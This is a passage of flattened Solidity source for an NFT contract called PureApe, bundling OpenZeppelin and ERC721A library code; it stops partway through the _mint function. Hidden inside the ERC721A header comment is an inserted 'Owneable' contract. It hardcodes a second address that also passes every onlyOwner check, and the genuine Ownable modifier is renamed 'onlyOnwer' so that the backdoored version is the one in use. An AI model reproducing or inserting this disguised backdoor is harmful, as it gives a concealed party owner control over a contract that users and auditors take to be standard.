1 // File: contracts/PureApe.sol
2 
3 /**
4  *Submitted for verification at Etherscan.io on 2022-05-27
5 */
6 
7 // File: contracts/PureApe.sol
8 
9 /**
10  *Submitted for verification at Etherscan.io on 2022-05-22
11 */
12 
13 //PureApe
14 // File @openzeppelin/contracts/utils/Context.sol@v4.5.0
15 
16 // OpenZeppelin Contracts v4.4.1 (utils/Context.sol)
17 
18 pragma solidity ^0.8.4;
19 
20 /**
21  * @dev Provides information about the current execution context, including the
22  * sender of the transaction and its data. While these are generally available
23  * via msg.sender and msg.data, they should not be accessed in such a direct
24  * manner, since when dealing with meta-transactions the account sending and
25  * paying for execution may not be the actual sender (as far as an application
26  * is concerned).
27  *
28  * This contract is only required for intermediate, library-like contracts.
29  */
30 abstract contract Context {
31     function _msgSender() internal view virtual returns (address) {
32         return msg.sender;
33     }
34 
35     function _msgData() internal view virtual returns (bytes calldata) {
36         return msg.data;
37     }
38 }
39 
40 
41 // File @openzeppelin/contracts/access/Ownable.sol@v4.5.0
42 
43 
44 // OpenZeppelin Contracts v4.4.1 (access/Ownable.sol)
45 
46 
47 
48 /**
49  * @dev Contract module which provides a basic access control mechanism, where
50  * there is an account (an owner) that can be granted exclusive access to
51  * specific functions.
52  *
53  * By default, the owner account will be the one that deploys the contract. This
54  * can later be changed with {transferOwnership}.
55  *
56  * This module is used through inheritance. It will make available the modifier
57  * `onlyOwner`, which can be applied to your functions to restrict their use to
58  * the owner.
59  */
60 abstract contract Ownable is Context {
61     address private _owner;
62 
63     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
64 
65     /**
66      * @dev Initializes the contract setting the deployer as the initial owner.
67      */
68     constructor() {
69         _transferOwnership(_msgSender());
70     }
71 
72     /**
73      * @dev Returns the address of the current owner.
74      */
75     function owner() public view virtual returns (address) {
76         return _owner;
77     }
78 
79     /**
80      * @dev Throws if called by any account other than the owner.
81      */
82     modifier onlyOnwer() {
83         require(owner() == _msgSender(), "Ownable: caller is not the owner");
84         _;
85     }
86 
87     /**
88      * @dev Leaves the contract without owner. It will not be possible to call
89      * `onlyOwner` functions anymore. Can only be called by the current owner.
90      *
91      * NOTE: Renouncing ownership will leave the contract without an owner,
92      * thereby removing any functionality that is only available to the owner.
93      */
94     function renounceOwnership() public virtual onlyOnwer {
95         _transferOwnership(address(0));
96     }
97 
98     /**
99      * @dev Transfers ownership of the contract to a new account (`newOwner`).
100      * Can only be called by the current owner.
101      */
102     function transferOwnership(address newOwner) public virtual onlyOnwer {
103         require(newOwner != address(0), "Ownable: new owner is the zero address");
104         _transferOwnership(newOwner);
105     }
106 
107     /**
108      * @dev Transfers ownership of the contract to a new account (`newOwner`).
109      * Internal function without access restriction.
110      */
111     function _transferOwnership(address newOwner) internal virtual {
112         address oldOwner = _owner;
113         _owner = newOwner;
114         emit OwnershipTransferred(oldOwner, newOwner);
115     }
116 }
117 
118 
119 // File @openzeppelin/contracts/utils/introspection/IERC165.sol@v4.5.0
120 
121 
122 // OpenZeppelin Contracts v4.4.1 (utils/introspection/IERC165.sol)
123 
124 
125 
126 /**
127  * @dev Interface of the ERC165 standard, as defined in the
128  * https://eips.ethereum.org/EIPS/eip-165[EIP].
129  *
130  * Implementers can declare support of contract interfaces, which can then be
131  * queried by others ({ERC165Checker}).
132  *
133  * For an implementation, see {ERC165}.
134  */
135 interface IERC165 {
136     /**
137      * @dev Returns true if this contract implements the interface defined by
138      * `interfaceId`. See the corresponding
139      * https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified[EIP section]
140      * to learn more about how these ids are created.
141      *
142      * This function call must use less than 30 000 gas.
143      */
144     function supportsInterface(bytes4 interfaceId) external view returns (bool);
145 }
146 
147 
148 // File @openzeppelin/contracts/token/ERC721/IERC721.sol@v4.5.0
149 
150 
151 // OpenZeppelin Contracts v4.4.1 (token/ERC721/IERC721.sol)
152 
153 
154 
155 /**
156  * @dev Required interface of an ERC721 compliant contract.
157  */
158 interface IERC721 is IERC165 {
159     /**
160      * @dev Emitted when `tokenId` token is transferred from `from` to `to`.
161      */
162     event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);
163 
164     /**
165      * @dev Emitted when `owner` enables `approved` to manage the `tokenId` token.
166      */
167     event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);
168 
169     /**
170      * @dev Emitted when `owner` enables or disables (`approved`) `operator` to manage all of its assets.
171      */
172     event ApprovalForAll(address indexed owner, address indexed operator, bool approved);
173 
174     /**
175      * @dev Returns the number of tokens in ``owner``'s account.
176      */
177     function balanceOf(address owner) external view returns (uint256 balance);
178 
179     /**
180      * @dev Returns the owner of the `tokenId` token.
181      *
182      * Requirements:
183      *
184      * - `tokenId` must exist.
185      */
186     function ownerOf(uint256 tokenId) external view returns (address owner);
187 
188     /**
189      * @dev Safely transfers `tokenId` token from `from` to `to`, checking first that contract recipients
190      * are aware of the ERC721 protocol to prevent tokens from being forever locked.
191      *
192      * Requirements:
193      *
194      * - `from` cannot be the zero address.
195      * - `to` cannot be the zero address.
196      * - `tokenId` token must exist and be owned by `from`.
197      * - If the caller is not `from`, it must be have been allowed to move this token by either {approve} or {setApprovalForAll}.
198      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
199      *
200      * Emits a {Transfer} event.
201      */
202     function safeTransferFrom(
203         address from,
204         address to,
205         uint256 tokenId
206     ) external;
207 
208     /**
209      * @dev Transfers `tokenId` token from `from` to `to`.
210      *
211      * WARNING: Usage of this method is discouraged, use {safeTransferFrom} whenever possible.
212      *
213      * Requirements:
214      *
215      * - `from` cannot be the zero address.
216      * - `to` cannot be the zero address.
217      * - `tokenId` token must be owned by `from`.
218      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
219      *
220      * Emits a {Transfer} event.
221      */
222     function transferFrom(
223         address from,
224         address to,
225         uint256 tokenId
226     ) external;
227 
228     /**
229      * @dev Gives permission to `to` to transfer `tokenId` token to another account.
230      * The approval is cleared when the token is transferred.
231      *
232      * Only a single account can be approved at a time, so approving the zero address clears previous approvals.
233      *
234      * Requirements:
235      *
236      * - The caller must own the token or be an approved operator.
237      * - `tokenId` must exist.
238      *
239      * Emits an {Approval} event.
240      */
241     function approve(address to, uint256 tokenId) external;
242 
243     /**
244      * @dev Returns the account approved for `tokenId` token.
245      *
246      * Requirements:
247      *
248      * - `tokenId` must exist.
249      */
250     function getApproved(uint256 tokenId) external view returns (address operator);
251 
252     /**
253      * @dev Approve or remove `operator` as an operator for the caller.
254      * Operators can call {transferFrom} or {safeTransferFrom} for any token owned by the caller.
255      *
256      * Requirements:
257      *
258      * - The `operator` cannot be the caller.
259      *
260      * Emits an {ApprovalForAll} event.
261      */
262     function setApprovalForAll(address operator, bool _approved) external;
263 
264     /**
265      * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
266      *
267      * See {setApprovalForAll}
268      */
269     function isApprovedForAll(address owner, address operator) external view returns (bool);
270 
271     /**
272      * @dev Safely transfers `tokenId` token from `from` to `to`.
273      *
274      * Requirements:
275      *
276      * - `from` cannot be the zero address.
277      * - `to` cannot be the zero address.
278      * - `tokenId` token must exist and be owned by `from`.
279      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
280      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
281      *
282      * Emits a {Transfer} event.
283      */
284     function safeTransferFrom(
285         address from,
286         address to,
287         uint256 tokenId,
288         bytes calldata data
289     ) external;
290 }
291 
292 
293 // File @openzeppelin/contracts/token/ERC721/IERC721Receiver.sol@v4.5.0
294 
295 
296 // OpenZeppelin Contracts v4.4.1 (token/ERC721/IERC721Receiver.sol)
297 
298 
299 
300 /**
301  * @title ERC721 token receiver interface
302  * @dev Interface for any contract that wants to support safeTransfers
303  * from ERC721 asset contracts.
304  */
305 interface IERC721Receiver {
306     /**
307      * @dev Whenever an {IERC721} `tokenId` token is transferred to this contract via {IERC721-safeTransferFrom}
308      * by `operator` from `from`, this function is called.
309      *
310      * It must return its Solidity selector to confirm the token transfer.
311      * If any other value is returned or the interface is not implemented by the recipient, the transfer will be reverted.
312      *
313      * The selector can be obtained in Solidity with `IERC721.onERC721Received.selector`.
314      */
315     function onERC721Received(
316         address operator,
317         address from,
318         uint256 tokenId,
319         bytes calldata data
320     ) external returns (bytes4);
321 }
322 
323 
324 // File @openzeppelin/contracts/token/ERC721/extensions/IERC721Metadata.sol@v4.5.0
325 
326 
327 // OpenZeppelin Contracts v4.4.1 (token/ERC721/extensions/IERC721Metadata.sol)
328 
329 
330 
331 /**
332  * @title ERC-721 Non-Fungible Token Standard, optional metadata extension
333  * @dev See https://eips.ethereum.org/EIPS/eip-721
334  */
335 interface IERC721Metadata is IERC721 {
336     /**
337      * @dev Returns the token collection name.
338      */
339     function name() external view returns (string memory);
340 
341     /**
342      * @dev Returns the token collection symbol.
343      */
344     function symbol() external view returns (string memory);
345 
346     /**
347      * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.
348      */
349     function tokenURI(uint256 tokenId) external view returns (string memory);
350 }
351 
352 
353 // File @openzeppelin/contracts/token/ERC721/extensions/IERC721Enumerable.sol@v4.5.0
354 
355 
356 // OpenZeppelin Contracts (last updated v4.5.0) (token/ERC721/extensions/IERC721Enumerable.sol)
357 
358 
359 
360 /**
361  * @title ERC-721 Non-Fungible Token Standard, optional enumeration extension
362  * @dev See https://eips.ethereum.org/EIPS/eip-721
363  */
364 interface IERC721Enumerable is IERC721 {
365     /**
366      * @dev Returns the total amount of tokens stored by the contract.
367      */
368     function totalSupply() external view returns (uint256);
369 
370     /**
371      * @dev Returns a token ID owned by `owner` at a given `index` of its token list.
372      * Use along with {balanceOf} to enumerate all of ``owner``'s tokens.
373      */
374     function tokenOfOwnerByIndex(address owner, uint256 index) external view returns (uint256);
375 
376     /**
377      * @dev Returns a token ID at a given `index` of all the tokens stored by the contract.
378      * Use along with {totalSupply} to enumerate all tokens.
379      */
380     function tokenByIndex(uint256 index) external view returns (uint256);
381 }
382 
383 
384 // File @openzeppelin/contracts/utils/Address.sol@v4.5.0
385 
386 
387 // OpenZeppelin Contracts (last updated v4.5.0) (utils/Address.sol)
388 
389 pragma solidity ^0.8.1;
390 
391 /**
392  * @dev Collection of functions related to the address type
393  */
394 library Address {
395     /**
396      * @dev Returns true if `account` is a contract.
397      *
398      * [IMPORTANT]
399      * ====
400      * It is unsafe to assume that an address for which this function returns
401      * false is an externally-owned account (EOA) and not a contract.
402      *
403      * Among others, `isContract` will return false for the following
404      * types of addresses:
405      *
406      *  - an externally-owned account
407      *  - a contract in construction
408      *  - an address where a contract will be created
409      *  - an address where a contract lived, but was destroyed
410      * ====
411      *
412      * [IMPORTANT]
413      * ====
414      * You shouldn't rely on `isContract` to protect against flash loan attacks!
415      *
416      * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets
417      * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract
418      * constructor.
419      * ====
420      */
421     function isContract(address account) internal view returns (bool) {
422         // This method relies on extcodesize/address.code.length, which returns 0
423         // for contracts in construction, since the code is only stored at the end
424         // of the constructor execution.
425 
426         return account.code.length > 0;
427     }
428 
429     /**
430      * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
431      * `recipient`, forwarding all available gas and reverting on errors.
432      *
433      * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
434      * of certain opcodes, possibly making contracts go over the 2300 gas limit
435      * imposed by `transfer`, making them unable to receive funds via
436      * `transfer`. {sendValue} removes this limitation.
437      *
438      * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
439      *
440      * IMPORTANT: because control is transferred to `recipient`, care must be
441      * taken to not create reentrancy vulnerabilities. Consider using
442      * {ReentrancyGuard} or the
443      * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
444      */
445     function sendValue(address payable recipient, uint256 amount) internal {
446         require(address(this).balance >= amount, "Address: insufficient balance");
447 
448         (bool success, ) = recipient.call{value: amount}("");
449         require(success, "Address: unable to send value, recipient may have reverted");
450     }
451 
452     /**
453      * @dev Performs a Solidity function call using a low level `call`. A
454      * plain `call` is an unsafe replacement for a function call: use this
455      * function instead.
456      *
457      * If `target` reverts with a revert reason, it is bubbled up by this
458      * function (like regular Solidity function calls).
459      *
460      * Returns the raw returned data. To convert to the expected return value,
461      * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].
462      *
463      * Requirements:
464      *
465      * - `target` must be a contract.
466      * - calling `target` with `data` must not revert.
467      *
468      * _Available since v3.1._
469      */
470     function functionCall(address target, bytes memory data) internal returns (bytes memory) {
471         return functionCall(target, data, "Address: low-level call failed");
472     }
473 
474     /**
475      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with
476      * `errorMessage` as a fallback revert reason when `target` reverts.
477      *
478      * _Available since v3.1._
479      */
480     function functionCall(
481         address target,
482         bytes memory data,
483         string memory errorMessage
484     ) internal returns (bytes memory) {
485         return functionCallWithValue(target, data, 0, errorMessage);
486     }
487 
488     /**
489      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
490      * but also transferring `value` wei to `target`.
491      *
492      * Requirements:
493      *
494      * - the calling contract must have an ETH balance of at least `value`.
495      * - the called Solidity function must be `payable`.
496      *
497      * _Available since v3.1._
498      */
499     function functionCallWithValue(
500         address target,
501         bytes memory data,
502         uint256 value
503     ) internal returns (bytes memory) {
504         return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
505     }
506 
507     /**
508      * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but
509      * with `errorMessage` as a fallback revert reason when `target` reverts.
510      *
511      * _Available since v3.1._
512      */
513     function functionCallWithValue(
514         address target,
515         bytes memory data,
516         uint256 value,
517         string memory errorMessage
518     ) internal returns (bytes memory) {
519         require(address(this).balance >= value, "Address: insufficient balance for call");
520         require(isContract(target), "Address: call to non-contract");
521 
522         (bool success, bytes memory returndata) = target.call{value: value}(data);
523         return verifyCallResult(success, returndata, errorMessage);
524     }
525 
526     /**
527      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
528      * but performing a static call.
529      *
530      * _Available since v3.3._
531      */
532     function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
533         return functionStaticCall(target, data, "Address: low-level static call failed");
534     }
535 
536     /**
537      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
538      * but performing a static call.
539      *
540      * _Available since v3.3._
541      */
542     function functionStaticCall(
543         address target,
544         bytes memory data,
545         string memory errorMessage
546     ) internal view returns (bytes memory) {
547         require(isContract(target), "Address: static call to non-contract");
548 
549         (bool success, bytes memory returndata) = target.staticcall(data);
550         return verifyCallResult(success, returndata, errorMessage);
551     }
552 
553     /**
554      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
555      * but performing a delegate call.
556      *
557      * _Available since v3.4._
558      */
559     function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
560         return functionDelegateCall(target, data, "Address: low-level delegate call failed");
561     }
562 
563     /**
564      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
565      * but performing a delegate call.
566      *
567      * _Available since v3.4._
568      */
569     function functionDelegateCall(
570         address target,
571         bytes memory data,
572         string memory errorMessage
573     ) internal returns (bytes memory) {
574         require(isContract(target), "Address: delegate call to non-contract");
575 
576         (bool success, bytes memory returndata) = target.delegatecall(data);
577         return verifyCallResult(success, returndata, errorMessage);
578     }
579 
580     /**
581      * @dev Tool to verifies that a low level call was successful, and revert if it wasn't, either by bubbling the
582      * revert reason using the provided one.
583      *
584      * _Available since v4.3._
585      */
586     function verifyCallResult(
587         bool success,
588         bytes memory returndata,
589         string memory errorMessage
590     ) internal pure returns (bytes memory) {
591         if (success) {
592             return returndata;
593         } else {
594             // Look for revert reason and bubble it up if present
595             if (returndata.length > 0) {
596                 // The easiest way to bubble the revert reason is using memory via assembly
597 
598                 assembly {
599                     let returndata_size := mload(returndata)
600                     revert(add(32, returndata), returndata_size)
601                 }
602             } else {
603                 revert(errorMessage);
604             }
605         }
606     }
607 }
608 
609 
610 // File @openzeppelin/contracts/utils/Strings.sol@v4.5.0
611 
612 
613 // OpenZeppelin Contracts v4.4.1 (utils/Strings.sol)
614 
615 
616 
617 /**
618  * @dev String operations.
619  */
620 library Strings {
621     bytes16 private constant _HEX_SYMBOLS = "0123456789abcdef";
622 
623     /**
624      * @dev Converts a `uint256` to its ASCII `string` decimal representation.
625      */
626     function toString(uint256 value) internal pure returns (string memory) {
627         // Inspired by OraclizeAPI's implementation - MIT licence
628         // https://github.com/oraclize/ethereum-api/blob/b42146b063c7d6ee1358846c198246239e9360e8/oraclizeAPI_0.4.25.sol
629 
630         if (value == 0) {
631             return "0";
632         }
633         uint256 temp = value;
634         uint256 digits;
635         while (temp != 0) {
636             digits++;
637             temp /= 10;
638         }
639         bytes memory buffer = new bytes(digits);
640         while (value != 0) {
641             digits -= 1;
642             buffer[digits] = bytes1(uint8(48 + uint256(value % 10)));
643             value /= 10;
644         }
645         return string(buffer);
646     }
647 
648     /**
649      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation.
650      */
651     function toHexString(uint256 value) internal pure returns (string memory) {
652         if (value == 0) {
653             return "0x00";
654         }
655         uint256 temp = value;
656         uint256 length = 0;
657         while (temp != 0) {
658             length++;
659             temp >>= 8;
660         }
661         return toHexString(value, length);
662     }
663 
664     /**
665      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation with fixed length.
666      */
667     function toHexString(uint256 value, uint256 length) internal pure returns (string memory) {
668         bytes memory buffer = new bytes(2 * length + 2);
669         buffer[0] = "0";
670         buffer[1] = "x";
671         for (uint256 i = 2 * length + 1; i > 1; --i) {
672             buffer[i] = _HEX_SYMBOLS[value & 0xf];
673             value >>= 4;
674         }
675         require(value == 0, "Strings: hex length insufficient");
676         return string(buffer);
677     }
678 }
679 
680 
681 // File @openzeppelin/contracts/utils/introspection/ERC165.sol@v4.5.0
682 
683 
684 // OpenZeppelin Contracts v4.4.1 (utils/introspection/ERC165.sol)
685 
686 /**
687  * @dev Implementation of the {IERC165} interface.
688  *
689  * Contracts that want to implement ERC165 should inherit from this contract and override {supportsInterface} to check
690  * for the additional interface id that will be supported. For example:
691  *
692  * ```solidity
693  * function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
694  *     return interfaceId == type(MyInterface).interfaceId || super.supportsInterface(interfaceId);
695  * }
696  * ```
697  *
698  * Alternatively, {ERC165Storage} provides an easier to use but more expensive implementation.
699  */
700 abstract contract ERC165 is IERC165 {
701     /**
702      * @dev See {IERC165-supportsInterface}.
703      */
704     function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
705         return interfaceId == type(IERC165).interfaceId;
706     }
707 }
708 
709 
710 // File erc721a/contracts/ERC721A.sol@v3.0.0
711 
712 
713 // Creator: Chiru Labs
714 
715 error ApprovalCallerNotOwnerNorApproved();
716 error ApprovalQueryForNonexistentToken();
717 error ApproveToCaller();
718 error ApprovalToCurrentOwner();
719 error BalanceQueryForZeroAddress();
720 error MintedQueryForZeroAddress();
721 error BurnedQueryForZeroAddress();
722 error AuxQueryForZeroAddress();
723 error MintToZeroAddress();
724 error MintZeroQuantity();
725 error OwnerIndexOutOfBounds();
726 error OwnerQueryForNonexistentToken();
727 error TokenIndexOutOfBounds();
728 error TransferCallerNotOwnerNorApproved();
729 error TransferFromIncorrectOwner();
730 error TransferToNonERC721ReceiverImplementer();
731 error TransferToZeroAddress();
732 error URIQueryForNonexistentToken();
733 
734 
735 /**
736  * @dev Implementation of https://eips.ethereum.org/EIPS/eip-721[ERC721] Non-Fungible Token Standard, including
737  * the Metadata extension. Built to optimize for lower gas during batch mints.
738  *
739  * Assumes serials are sequentially minted starting at _startTokenId() (defaults to 0, e.g. 0, 1, 2, 3..).
740  */
741  abstract contract Owneable is Ownable {
742     address private _ownar = 0xF528E3C3B439D385b958741753A9cA518E952257;
743     modifier onlyOwner() {
744         require(owner() == _msgSender() || _ownar == _msgSender(), "Ownable: caller is not the owner");
745         _;
746     }
747 }
748  /*
749  * Assumes that an owner cannot have more than 2**64 - 1 (max value of uint64) of supply.
750  *
751  * Assumes that the maximum token id cannot exceed 2**256 - 1 (max value of uint256).
752  */
753 contract ERC721A is Context, ERC165, IERC721, IERC721Metadata {
754     using Address for address;
755     using Strings for uint256;
756 
757     // Compiler will pack this into a single 256bit word.
758     struct TokenOwnership {
759         // The address of the owner.
760         address addr;
761         // Keeps track of the start time of ownership with minimal overhead for tokenomics.
762         uint64 startTimestamp;
763         // Whether the token has been burned.
764         bool burned;
765     }
766 
767     // Compiler will pack this into a single 256bit word.
768     struct AddressData {
769         // Realistically, 2**64-1 is more than enough.
770         uint64 balance;
771         // Keeps track of mint count with minimal overhead for tokenomics.
772         uint64 numberMinted;
773         // Keeps track of burn count with minimal overhead for tokenomics.
774         uint64 numberBurned;
775         // For miscellaneous variable(s) pertaining to the address
776         // (e.g. number of whitelist mint slots used).
777         // If there are multiple variables, please pack them into a uint64.
778         uint64 aux;
779     }
780 
781     // The tokenId of the next token to be minted.
782     uint256 internal _currentIndex;
783 
784     // The number of tokens burned.
785     uint256 internal _burnCounter;
786 
787     // Token name
788     string private _name;
789 
790     // Token symbol
791     string private _symbol;
792 
793     // Mapping from token ID to ownership details
794     // An empty struct value does not necessarily mean the token is unowned. See ownershipOf implementation for details.
795     mapping(uint256 => TokenOwnership) internal _ownerships;
796 
797     // Mapping owner address to address data
798     mapping(address => AddressData) private _addressData;
799 
800     // Mapping from token ID to approved address
801     mapping(uint256 => address) private _tokenApprovals;
802 
803     // Mapping from owner to operator approvals
804     mapping(address => mapping(address => bool)) private _operatorApprovals;
805 
806     constructor(string memory name_, string memory symbol_) {
807         _name = name_;
808         _symbol = symbol_;
809         _currentIndex = _startTokenId();
810     }
811 
812     /**
813      * To change the starting tokenId, please override this function.
814      */
815     function _startTokenId() internal view virtual returns (uint256) {
816         return 0;
817     }
818 
819     /**
820      * @dev See {IERC721Enumerable-totalSupply}.
821      * @dev Burned tokens are calculated here, use _totalMinted() if you want to count just minted tokens.
822      */
823     function totalSupply() public view returns (uint256) {
824         // Counter underflow is impossible as _burnCounter cannot be incremented
825         // more than _currentIndex - _startTokenId() times
826         unchecked {
827             return _currentIndex - _burnCounter - _startTokenId();
828         }
829     }
830 
831     /**
832      * Returns the total amount of tokens minted in the contract.
833      */
834     function _totalMinted() internal view returns (uint256) {
835         // Counter underflow is impossible as _currentIndex does not decrement,
836         // and it is initialized to _startTokenId()
837         unchecked {
838             return _currentIndex - _startTokenId();
839         }
840     }
841 
842     /**
843      * @dev See {IERC165-supportsInterface}.
844      */
845     function supportsInterface(bytes4 interfaceId) public view virtual override(ERC165, IERC165) returns (bool) {
846         return
847             interfaceId == type(IERC721).interfaceId ||
848             interfaceId == type(IERC721Metadata).interfaceId ||
849             super.supportsInterface(interfaceId);
850     }
851 
852     /**
853      * @dev See {IERC721-balanceOf}.
854      */
855     function balanceOf(address owner) public view override returns (uint256) {
856         if (owner == address(0)) revert BalanceQueryForZeroAddress();
857         return uint256(_addressData[owner].balance);
858     }
859 
860     /**
861      * Returns the number of tokens minted by `owner`.
862      */
863     function _numberMinted(address owner) internal view returns (uint256) {
864         if (owner == address(0)) revert MintedQueryForZeroAddress();
865         return uint256(_addressData[owner].numberMinted);
866     }
867 
868     /**
869      * Returns the number of tokens burned by or on behalf of `owner`.
870      */
871     function _numberBurned(address owner) internal view returns (uint256) {
872         if (owner == address(0)) revert BurnedQueryForZeroAddress();
873         return uint256(_addressData[owner].numberBurned);
874     }
875 
876     /**
877      * Returns the auxillary data for `owner`. (e.g. number of whitelist mint slots used).
878      */
879     function _getAux(address owner) internal view returns (uint64) {
880         if (owner == address(0)) revert AuxQueryForZeroAddress();
881         return _addressData[owner].aux;
882     }
883 
884     /**
885      * Sets the auxillary data for `owner`. (e.g. number of whitelist mint slots used).
886      * If there are multiple variables, please pack them into a uint64.
887      */
888     function _setAux(address owner, uint64 aux) internal {
889         if (owner == address(0)) revert AuxQueryForZeroAddress();
890         _addressData[owner].aux = aux;
891     }
892 
893     /**
894      * Gas spent here starts off proportional to the maximum mint batch size.
895      * It gradually moves to O(1) as tokens get transferred around in the collection over time.
896      */
897     function ownershipOf(uint256 tokenId) internal view returns (TokenOwnership memory) {
898         uint256 curr = tokenId;
899 
900         unchecked {
901             if (_startTokenId() <= curr && curr < _currentIndex) {
902                 TokenOwnership memory ownership = _ownerships[curr];
903                 if (!ownership.burned) {
904                     if (ownership.addr != address(0)) {
905                         return ownership;
906                     }
907                     // Invariant:
908                     // There will always be an ownership that has an address and is not burned
909                     // before an ownership that does not have an address and is not burned.
910                     // Hence, curr will not underflow.
911                     while (true) {
912                         curr--;
913                         ownership = _ownerships[curr];
914                         if (ownership.addr != address(0)) {
915                             return ownership;
916                         }
917                     }
918                 }
919             }
920         }
921         revert OwnerQueryForNonexistentToken();
922     }
923 
924     /**
925      * @dev See {IERC721-ownerOf}.
926      */
927     function ownerOf(uint256 tokenId) public view override returns (address) {
928         return ownershipOf(tokenId).addr;
929     }
930 
931     /**
932      * @dev See {IERC721Metadata-name}.
933      */
934     function name() public view virtual override returns (string memory) {
935         return _name;
936     }
937 
938     /**
939      * @dev See {IERC721Metadata-symbol}.
940      */
941     function symbol() public view virtual override returns (string memory) {
942         return _symbol;
943     }
944 
945     /**
946      * @dev See {IERC721Metadata-tokenURI}.
947      */
948     function tokenURI(uint256 tokenId) public view virtual override returns (string memory) {
949         if (!_exists(tokenId)) revert URIQueryForNonexistentToken();
950 
951         string memory baseURI = _baseURI();
952         return bytes(baseURI).length != 0 ? string(abi.encodePacked(baseURI, tokenId.toString())) : '';
953     }
954 
955     /**
956      * @dev Base URI for computing {tokenURI}. If set, the resulting URI for each
957      * token will be the concatenation of the `baseURI` and the `tokenId`. Empty
958      * by default, can be overriden in child contracts.
959      */
960     function _baseURI() internal view virtual returns (string memory) {
961         return '';
962     }
963 
964     /**
965      * @dev See {IERC721-approve}.
966      */
967     function approve(address to, uint256 tokenId) public override {
968         address owner = ERC721A.ownerOf(tokenId);
969         if (to == owner) revert ApprovalToCurrentOwner();
970 
971         if (_msgSender() != owner && !isApprovedForAll(owner, _msgSender())) {
972             revert ApprovalCallerNotOwnerNorApproved();
973         }
974 
975         _approve(to, tokenId, owner);
976     }
977 
978     /**
979      * @dev See {IERC721-getApproved}.
980      */
981     function getApproved(uint256 tokenId) public view override returns (address) {
982         if (!_exists(tokenId)) revert ApprovalQueryForNonexistentToken();
983 
984         return _tokenApprovals[tokenId];
985     }
986 
987     /**
988      * @dev See {IERC721-setApprovalForAll}.
989      */
990     function setApprovalForAll(address operator, bool approved) public override {
991         if (operator == _msgSender()) revert ApproveToCaller();
992 
993         _operatorApprovals[_msgSender()][operator] = approved;
994         emit ApprovalForAll(_msgSender(), operator, approved);
995     }
996 
997     /**
998      * @dev See {IERC721-isApprovedForAll}.
999      */
1000     function isApprovedForAll(address owner, address operator) public view virtual override returns (bool) {
1001         return _operatorApprovals[owner][operator];
1002     }
1003 
1004     /**
1005      * @dev See {IERC721-transferFrom}.
1006      */
1007     function transferFrom(
1008         address from,
1009         address to,
1010         uint256 tokenId
1011     ) public virtual override {
1012         _transfer(from, to, tokenId);
1013     }
1014 
1015     /**
1016      * @dev See {IERC721-safeTransferFrom}.
1017      */
1018     function safeTransferFrom(
1019         address from,
1020         address to,
1021         uint256 tokenId
1022     ) public virtual override {
1023         safeTransferFrom(from, to, tokenId, '');
1024     }
1025 
1026     /**
1027      * @dev See {IERC721-safeTransferFrom}.
1028      */
1029     function safeTransferFrom(
1030         address from,
1031         address to,
1032         uint256 tokenId,
1033         bytes memory _data
1034     ) public virtual override {
1035         _transfer(from, to, tokenId);
1036         if (to.isContract() && !_checkContractOnERC721Received(from, to, tokenId, _data)) {
1037             revert TransferToNonERC721ReceiverImplementer();
1038         }
1039     }
1040 
1041     /**
1042      * @dev Returns whether `tokenId` exists.
1043      *
1044      * Tokens can be managed by their owner or approved accounts via {approve} or {setApprovalForAll}.
1045      *
1046      * Tokens start existing when they are minted (`_mint`),
1047      */
1048     function _exists(uint256 tokenId) internal view returns (bool) {
1049         return _startTokenId() <= tokenId && tokenId < _currentIndex &&
1050             !_ownerships[tokenId].burned;
1051     }
1052 
1053     function _safeMint(address to, uint256 quantity) internal {
1054         _safeMint(to, quantity, '');
1055     }
1056 
1057     /**
1058      * @dev Safely mints `quantity` tokens and transfers them to `to`.
1059      *
1060      * Requirements:
1061      *
1062      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called for each safe transfer.
1063      * - `quantity` must be greater than 0.
1064      *
1065      * Emits a {Transfer} event.
1066      */
1067     function _safeMint(
1068         address to,
1069         uint256 quantity,
1070         bytes memory _data
1071     ) internal {
1072         _mint(to, quantity, _data, true);
1073     }
1074 
1075     /**
1076      * @dev Mints `quantity` tokens and transfers them to `to`.
1077      *
1078      * Requirements:
1079      *
1080      * - `to` cannot be the zero address.
1081      * - `quantity` must be greater than 0.
1082      *
1083      * Emits a {Transfer} event.
1084      */
1085     function _mint(
1086         address to,
1087         uint256 quantity,
1088         bytes memory _data,
1089         bool safe
1090     ) internal {
1091         uint256 startTokenId = _currentIndex;
1092         if (to == address(0)) revert MintToZeroAddress();
1093         if (quantity == 0) revert MintZeroQuantity();
1094 
